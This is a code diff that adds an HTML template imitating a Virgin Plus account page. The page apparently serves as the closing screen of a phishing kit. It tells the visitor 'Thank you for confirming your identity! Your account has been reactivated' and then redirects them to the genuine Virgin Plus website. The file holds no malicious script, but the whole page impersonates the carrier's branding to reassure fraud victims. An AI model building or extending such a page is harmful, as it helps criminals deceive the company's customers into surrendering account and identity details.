@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- For mobile responsiveness -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Success</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+
+<div class="site-wrapper">
+  <header class="red-header">
+    <div class="header-left">
+      <img src="static/images/virgin-logo.png" alt="Virgin Plus Logo"/>
+    </div>
+    <!-- Desktop nav if you like -->
+    <div class="desktop-nav">
+      <a href="#" class="lang-link">FR</a>
+      <a href="#" class="user-icon">&#128100;</a>
+    </div>
+    <!-- Optional hamburger if you want the same style -->
+    <div class="hamburger" onclick="toggleMobileMenu()">
+      &#9776;
+    </div>
+  </header>
+
+  <nav class="mobile-menu" id="mobileMenu">
+    <div class="mobile-menu-header">
+      <span class="close-btn" onclick="toggleMobileMenu()">&times;</span>
+      <img src="static/images/virgin-logo.png" alt="Virgin Plus Logo" />
+    </div>
+    <ul>
+      <li><a href="#">FRANÇAIS</a></li>
+      <li><a href="#">TOP UP PREPAID</a></li>
+      <li><a href="#">ACTIVATE PREPAID</a></li>
+      <li><a href="#">MY ACCOUNT</a></li>
+    </ul>
+  </nav>
+
+  <main class="login-container">
+    <!-- left-col => maybe a short message -->
+    <div class="left-col">
+      <h2>Account Reactivated</h2>
+    </div>
+
+    <!-- right-col => the “Thank you” message + close button -->
+    <div class="right-col">
+      <h1>Thank you for confirming your identity!</h1>
+      <p>Your account has been reactivated.</p>
+      
+      <a class="login-btn" href="https://www.virginplus.ca/en/home/index.html" style="margin-top: 2rem; display: inline-block; text-align: center;">
+        Close Session
+      </a>
+    </div>
+  </main>
+
+  <footer class="page-footer">
+    <div class="footer-links">
+      <a href="#">Contact Us</a> |
+      <a href="#">Legal &amp; Regulatory</a> |
+      <a href="#">Track your order</a> |
+      <a href="#">Wireless Code Member Rights</a> |
+      <a href="#">Provide Feedback</a>
+    </div>
+    <div class="footer-note">
+      &copy; Virgin Plus. All rights reserved.
+    </div>
+  </footer>
+</div>
+
+<!-- Toggle script if using the hamburger -->
+<script>
+function toggleMobileMenu() {
+  var menu = document.getElementById("mobileMenu");
+  menu.classList.toggle("open");
+}
+</script>
+
+</body>
+</html>
